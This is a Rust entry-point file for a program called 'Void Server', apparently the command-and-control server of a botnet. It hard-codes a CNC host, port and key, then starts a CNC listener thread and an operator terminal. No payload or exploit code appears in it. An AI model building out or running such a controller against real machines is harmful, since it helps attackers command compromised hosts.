mod cnc;
mod cli;
mod structs;
mod enums;

use std::sync::{Arc, Mutex};
use std::io::Write;

use log::{info};

use crate::{structs::{cnc::Cnc, net::CncNet}, cnc::server::server, cli::terminal::run};

static CNC_HOST: &str = "127.0.0.1";
static CNC_PORT: u16 = 8080;
static CNC_KEY: u32 = 0xcafebabe;

pub fn main() -> std::io::Result<()> {

    env_logger::builder()
            .format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()))
            .filter_level(log::LevelFilter::max())
            .try_init()
            .unwrap();

    info!("Void Server");

    let net_arc = Arc::new(Mutex::new(Cnc::new()));
    let cli_arc = net_arc.clone();

    let net_handle = std::thread::spawn(move ||{
        info!("Starting CNC thread");
        server(&mut CncNet::new(CNC_HOST, CNC_PORT, &net_arc), CNC_KEY);
    });


    run(&cli_arc);

    match net_handle.join() {
        Ok(_) => (),
        Err(e) => panic!("{:?}", e)
    };
    Ok(())
}